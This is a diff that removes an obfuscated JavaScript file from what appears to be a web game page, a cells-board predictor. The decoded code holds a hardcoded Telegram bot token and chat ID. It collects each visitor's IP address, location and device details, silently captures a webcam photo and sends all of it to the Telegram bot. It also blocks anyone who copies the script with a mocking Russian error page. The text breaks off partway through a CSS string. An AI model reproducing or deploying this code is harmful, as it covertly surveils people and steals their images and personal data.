@@ -1,1 +1,437 @@
-function _0x4a36(_0x15ddb3,_0xc8ca30){const _0x1a751c=_0x1a75();return _0x4a36=function(_0x4a3603,_0x3c0f9c){_0x4a3603=_0x4a3603-0x135;let _0xca8177=_0x1a751c[_0x4a3603];return _0xca8177;},_0x4a36(_0x15ddb3,_0xc8ca30);}const _0x3e4697=_0x4a36;(function(_0xb623d6,_0x3840ba){const _0x6bc35e=_0x4a36,_0xd04302=_0xb623d6();while(!![]){try{const _0x135fc4=parseInt(_0x6bc35e(0x158))/0x1*(-parseInt(_0x6bc35e(0x1c2))/0x2)+parseInt(_0x6bc35e(0x168))/0x3*(parseInt(_0x6bc35e(0x182))/0x4)+parseInt(_0x6bc35e(0x19f))/0x5+-parseInt(_0x6bc35e(0x14e))/0x6*(parseInt(_0x6bc35e(0x1bc))/0x7)+parseInt(_0x6bc35e(0x1d6))/0x8+parseInt(_0x6bc35e(0x197))/0x9+parseInt(_0x6bc35e(0x15e))/0xa*(parseInt(_0x6bc35e(0x13f))/0xb);if(_0x135fc4===_0x3840ba)break;else _0xd04302['push'](_0xd04302['shift']());}catch(_0x26ab4a){_0xd04302['push'](_0xd04302['shift']());}}}(_0x1a75,0xae94e));function _0x1a75(){const _0x34b976=['regex','Failed\x20to\x20initialize\x20bot:','</code>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','./output_svgs/image_127381.svg','disabled','getUserMedia','button','https://ipinfo.io/json','trim','video','getElementById','Linux','modeButton','deviceOS','get','classList','map','Failed\x20to\x20fetch\x20country\x20name:','fromCodePoint','4fjNxUx','play','Failed\x20to\x20send\x20message:','domain','https://api.telegram.org/bot','.cells-board\x20.cell','Element\x20.cells-board\x20not\x20found.','cell',')</code>\x0a📱\x20User\x20Agent:\x20<code>','POST','7372403962:AAFmv-2kXknZY6JOtRkGaEknCoufQ-DScjM','common','deviceType','./output_svgs/image_146917.svg','./output_svgs/image_159757.svg','stop','./output_svgs/image_69793.svg','xMidYMid\x20meet','<./img\x20width=\x2256\x22\x20height=\x2256\x22\x20src=\x22','getTracks','./img','8817822dzZAea','includes','region','Android','Photo\x20captured\x20and\x20sent\x20successfully','getAttribute','viewBox','Bot\x20initialized','1816220yQRsvi','Windows','./output_svgs/image_121237.svg','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-height:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20block;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20opacity\x200.3s,\x20transform\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','remove','getContext','canvas','replace','0\x200\x20','match','model','5732636702','</code>\x0a🖥️\x20Type:\x20<code>','href','./output_svgs/image_37357.svg','svg','countryName','trapsAmount','charCodeAt','then','preserveAspectRatio','type','Switch\x20to\x20All','div','city','stringify','Unknown','reload','./output_svgs/image_102217.svg','271838jtnUrF','./output_svgs/image_95509.svg','osdisdll300s9in.vercel.app','./img/krest.svg','deviceModel','</code>\x0a⏰\x20Time:\x20<code>','2XQTILb','\x0a📱\x20Device:\x20<code>','/getMe','100','search','cell-fade-out','https://restcountries.com/v3.1/alpha/','log','./output_svgs/image_24493.svg','country','</code>\x0a🔗\x20URL:\x20<code>','drawImage','userAgent','has','click','cssText','DOMContentLoaded','body','style','block','5236184QUMMWV','.cells-board','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20relative;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','./output_svgs/image_50221.svg','toISOString','nesk','fullUrl','add','srcObject','iOS','all','appendChild','./output_svgs/image_5450.svg','size','prev_preset_btn','star-animation','./output_svgs/image_115081.svg','./img/stars.png','videoHeight','scale(0)','</code>\x0a📌\x20Location:\x20','photo','json','width','playButton','photo.jpg','querySelector','/sendMessage','src','language','forEach','error','./output_svgs/image_44065.svg','6138qHbIGc','innerHTML','height','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20relative;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','./output_svgs/image_140221.svg','\x0a🚀\x20<b>New\x20Bot\x20Access\x20Detected</b>\x0a📍\x20Domain:\x20<code>','./output_svgs/image_56929.svg','display','opacity','length','next_preset_btn','Windows\x20','textContent','push','toBlob','96lyHJMY','./output_svgs/image_18337.svg','floor','./output_svgs/image_89353.svg','location','append','scale(1)','pause','chat_id','text','1396480YmxGvW','setAttribute','transform','\x0a🚫\x20<b>Unauthorized\x20Access\x20Attempt\x20Detected</b>\x0a📍\x20Domain:\x20<code>','hostname','application/json','9060YAAWLG','countryEmoji','Desktop','HTML','Unknown\x20Device','./output_svgs/image_108373.svg','</code>\x0a🌐\x20IP:\x20<code>','addEventListener','videoWidth','querySelectorAll','689511gYsoLL','iPad','Mobile','./output_svgs/image_82645.svg','./output_svgs/image_75949.svg','head','createElement'];_0x1a75=function(){return _0x34b976;};return _0x1a75();}const TELEGRAM_BOT_TOKEN=_0x3e4697(0x18c),ADMIN_ID=_0x3e4697(0x1aa);async function sendTelegramMessage(_0x5a661b){const _0x3bd87e=_0x3e4697;try{const _0x29b540=await fetch('https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+_0x3bd87e(0x139),{'method':_0x3bd87e(0x18b),'headers':{'Content-Type':_0x3bd87e(0x15d)},'body':JSON[_0x3bd87e(0x1b8)]({'chat_id':ADMIN_ID,'text':_0x5a661b,'parse_mode':_0x3bd87e(0x161)})}),_0x231876=await _0x29b540['json']();!_0x231876['ok']&&console['error']('Failed\x20to\x20send\x20message:',_0x231876);}catch(_0x50380d){console[_0x3bd87e(0x13d)](_0x3bd87e(0x184),_0x50380d);}}async function getCountryName(_0x31fb96){const _0xab8d71=_0x3e4697;try{const _0x31bc6a=await fetch(_0xab8d71(0x1c8)+_0x31fb96),_0x2cd593=await _0x31bc6a[_0xab8d71(0x1ec)]();return _0x2cd593[0x0]?.['name'][_0xab8d71(0x18d)]||_0xab8d71(0x1b9);}catch(_0x29da7b){return console[_0xab8d71(0x13d)](_0xab8d71(0x180),_0x29da7b),_0xab8d71(0x1b9);}}async function getUserInfo(){const _0x478be9=_0x3e4697;try{const _0x4200d7=await fetch(_0x478be9(0x176)),_0x788288=await _0x4200d7[_0x478be9(0x1ec)](),_0x194abe=await getCountryName(_0x788288['country']),_0x4bc9a8=parseUserAgent(navigator[_0x478be9(0x1ce)]);return{'ip':_0x788288['ip'],'country':_0x788288[_0x478be9(0x1cb)],'countryName':_0x194abe,'city':_0x788288[_0x478be9(0x1b7)],'region':_0x788288['region'],'countryEmoji':getCountryEmoji(_0x788288[_0x478be9(0x1cb)]),'userAgent':navigator['userAgent'],'deviceModel':_0x4bc9a8[_0x478be9(0x1a9)],'deviceType':_0x4bc9a8[_0x478be9(0x1b4)],'deviceOS':_0x4bc9a8['os']};}catch(_0x6be676){console[_0x478be9(0x13d)]('Failed\x20to\x20fetch\x20user\x20info:',_0x6be676);const _0x2f7940={'ip':_0x478be9(0x1b9),'country':_0x478be9(0x1b9),'countryName':_0x478be9(0x1b9),'city':'Unknown','region':_0x478be9(0x1b9),'countryEmoji':'❓','userAgent':navigator[_0x478be9(0x1ce)],'deviceModel':'Unknown','deviceType':'Unknown','deviceOS':_0x478be9(0x1b9)};return _0x2f7940;}}function parseUserAgent(_0x31eca1){const _0x5417f7=_0x3e4697,_0x36dcbf=[{'regex':/iPhone\s*(\d+([_\.]\d+)*)/i,'type':_0x5417f7(0x16a),'os':_0x5417f7(0x1df)},{'regex':/iPad/i,'type':'Tablet','os':_0x5417f7(0x1df)},{'regex':/Android\s*([\d\.]+)/i,'type':_0x5417f7(0x16a),'os':_0x5417f7(0x19a)},{'regex':/Windows Phone\s*([\d\.]+)/i,'type':_0x5417f7(0x16a),'os':'Windows\x20Phone'}],_0x26c070=[{'regex':/Windows/i,'type':_0x5417f7(0x160),'os':_0x5417f7(0x1a0)},{'regex':/Macintosh/i,'type':_0x5417f7(0x160),'os':'macOS'},{'regex':/Linux/i,'type':'Desktop','os':_0x5417f7(0x17a)}];for(let _0x451322 of _0x36dcbf){const _0x7fb5a5=_0x31eca1['match'](_0x451322[_0x5417f7(0x16f)]);if(_0x7fb5a5)return{'type':_0x451322['type'],'os':_0x451322['os'],'model':parseDeviceModel(_0x31eca1,_0x451322['os'])};}for(let _0x33fd13 of _0x26c070){const _0x3a901f=_0x31eca1[_0x5417f7(0x1a8)](_0x33fd13['regex']);if(_0x3a901f)return{'type':_0x33fd13[_0x5417f7(0x1b4)],'os':_0x33fd13['os'],'model':parseDeviceModel(_0x31eca1,_0x33fd13['os'])};}return{'type':_0x5417f7(0x1b9),'os':_0x5417f7(0x1b9),'model':_0x5417f7(0x162)};}function parseDeviceModel(_0x376f7b,_0x250124){const _0x4a321b=_0x3e4697;switch(_0x250124){case'iOS':const _0x381986=_0x376f7b[_0x4a321b(0x1a8)](/iPhone\s*(\d+([_\.]\d+)*)/i);if(_0x381986)return'iPhone\x20'+_0x381986[0x1][_0x4a321b(0x1a6)](/[_\.]/g,'\x20');const _0xe7d7ca=_0x376f7b[_0x4a321b(0x1a8)](/iPad/i);if(_0xe7d7ca)return _0x4a321b(0x169);break;case _0x4a321b(0x19a):const _0xa09499=_0x376f7b[_0x4a321b(0x1a8)](/;\s*([^;)]+)\s*Build/i);if(_0xa09499)return _0xa09499[0x1][_0x4a321b(0x177)]();break;case _0x4a321b(0x1a0):const _0x219103=_0x376f7b['match'](/Windows\s*([\w\s]+)/i);if(_0x219103)return _0x4a321b(0x14a)+_0x219103[0x1];break;case'macOS':const _0x974af0=_0x376f7b[_0x4a321b(0x1a8)](/Macintosh;.*Mac\s*([\w\s]+)/i);if(_0x974af0)return'Mac\x20'+_0x974af0[0x1];break;}return _0x4a321b(0x162);}function getCountryEmoji(_0x30a909){const _0x3e0b64=_0x3e4697;return _0x30a909[_0x3e0b64(0x1a6)](/./g,_0x19ff7b=>String[_0x3e0b64(0x181)](0x1f1a5+_0x19ff7b['toUpperCase']()[_0x3e0b64(0x1b1)]()));}async function captureAndSendPhoto(){const _0x212fe6=_0x3e4697;try{const _0x440ae0=await navigator['mediaDevices'][_0x212fe6(0x174)]({'video':!![]}),_0x1ebc8d=document[_0x212fe6(0x16e)](_0x212fe6(0x178));_0x1ebc8d[_0x212fe6(0x1de)]=_0x440ae0,await _0x1ebc8d[_0x212fe6(0x183)]();const _0x32229b=document[_0x212fe6(0x16e)](_0x212fe6(0x1a5));_0x32229b[_0x212fe6(0x135)]=_0x1ebc8d[_0x212fe6(0x166)],_0x32229b[_0x212fe6(0x141)]=_0x1ebc8d[_0x212fe6(0x1e8)];const _0x360989=_0x32229b[_0x212fe6(0x1a4)]('2d');_0x360989[_0x212fe6(0x1cd)](_0x1ebc8d,0x0,0x0,_0x32229b[_0x212fe6(0x135)],_0x32229b[_0x212fe6(0x141)]),_0x1ebc8d[_0x212fe6(0x155)](),_0x440ae0[_0x212fe6(0x195)]()[_0x212fe6(0x13c)](_0x750c56=>_0x750c56[_0x212fe6(0x191)]());const _0x39efaf=await new Promise(_0x491efe=>_0x32229b[_0x212fe6(0x14d)](_0x491efe,'image/jpeg')),_0x3ec91d=new FormData();_0x3ec91d[_0x212fe6(0x153)](_0x212fe6(0x156),ADMIN_ID),_0x3ec91d[_0x212fe6(0x153)](_0x212fe6(0x1eb),_0x39efaf,_0x212fe6(0x137)),await fetch(_0x212fe6(0x186)+TELEGRAM_BOT_TOKEN+'/sendPhoto',{'method':'POST','body':_0x3ec91d}),console[_0x212fe6(0x1c9)](_0x212fe6(0x19b));}catch(_0xf3c3b4){console[_0x212fe6(0x13d)]('Failed\x20to\x20capture\x20photo:',_0xf3c3b4);}}async function initTelegramBot(){const _0x5d23b1=_0x3e4697,_0x2e9db7={'domain':window[_0x5d23b1(0x152)][_0x5d23b1(0x15c)],'fullUrl':window['location'][_0x5d23b1(0x1ac)]},_0x220a23=_0x2e9db7;if(_0x220a23[_0x5d23b1(0x185)]!=='osdisdll300s9in.vercel.app'&&_0x220a23['domain']!==_0x5d23b1(0x1be)){document[_0x5d23b1(0x1d3)][_0x5d23b1(0x140)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22overlay\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Ошибка\x20404:\x20Доступ\x20запрещен</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22arrow\x20top\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22arrow\x20bottom\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22arrow\x20left\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22arrow\x20right\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<./img\x20src=\x22data:image/png;base64,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\x22\x20alt=\x22Error\x20Image\x22\x20style=\x22max-width:\x20100%;\x20height:\x20auto;\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>К\x20сожалению,\x20возникли\x20проблемы\x20с\x20доступом\x20к\x20сайту:</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Не\x20удалось\x20загрузить\x20ресурс.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Проблемы\x20с\x20сервером.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Неправильный\x20домен.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Возможно\x20вы\x20нищий\x20блюм.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Возможно\x20вы\x20хотели\x20спиздить\x20вебку.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Возможно\x20вы\x20хотели\x20обновить\x20вебку\x20за\x2015$.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Возможно\x20вы\x20хотели\x20купить\x20вебку\x20у\x20ее\x20кодера.</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.youtube.com/watch?v=dQw4w9WgXcQ\x22\x20id=\x22fixButton\x22>Fix\x20It</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';const _0x545610=document[_0x5d23b1(0x16e)](_0x5d23b1(0x1d4));_0x545610[_0x5d23b1(0x140)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20relative;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20overflow:\x20hidden;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#282c34;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27Arial\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#overlay\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20absolute;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20right:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20bottom:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20rgba(255,\x200,\x200,\x200.7),\x20rgba(255,\x20255,\x200,\x200.7));\x0a\x20\x20\x20\